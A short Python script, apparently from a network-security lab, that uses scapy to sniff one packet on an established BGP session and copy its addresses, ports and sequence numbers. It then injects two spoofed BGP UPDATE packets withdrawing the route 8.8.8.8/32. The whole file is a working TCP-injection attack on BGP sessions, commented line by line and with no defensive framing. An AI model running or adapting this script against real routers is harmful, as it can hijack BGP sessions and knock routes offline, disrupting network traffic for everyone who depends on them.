#!/usr/bin/env python3
#Import time so we can set a sleep timer
import time
#Import scapy
from scapy.all import *
#Import BGP
load_contrib('bgp')

#Sniff for a BGP packet
pkt = sniff(filter="tcp and ip dst 192.168.1.249",count=1)

for i in range (0, 2):
    #Create a new Ethernet frame
    frame1=Ether()
    #Set destination MAC address to captured BGP frame
    frame1.dst = pkt[0].dst
    #Set source MAC address to captured BGP frame
    frame1.src = pkt[0].src
    #Set Ethernet Type to captured BGP frame
    frame1.type = pkt[0].type
    #Set destination port to captured BGP packet TCP port number
    mydport = pkt[0].dport
    #Set source port to captured BGP packet TCP port number
    mysport = pkt[0].sport
    #Set sequence number to captured BGP packet + i (loop value)
    seq_num = pkt[0].seq + i
    #Set ack number to captured BGP packet 
    ack_num = pkt[0].ack
    #Set source IP address to captured BGP packet 
    ipsrc = pkt[0][IP].src
    #Set desination IP address to captured BGP packet
    ipdst = pkt[0][IP].dst
    #Craft BGP route removal packet (update to remove route) Marker is a bunch of F's in hex  
    bgp_remove = IP(src=ipsrc, dst=ipdst, ttl=1)\
        /TCP(dport=mydport, sport=mysport, flags="PA", seq=seq_num, ack=ack_num)\
        /BGPHeader(marker=340282366920938463463374607431768211455, len=28, type="UPDATE")\
        /BGPUpdate(withdrawn_routes_len=5, withdrawn_routes=[BGPNLRI_IPv4(prefix="8.8.8.8/32")])

    sendp(frame1/bgp_remove)
    time.sleep(1)


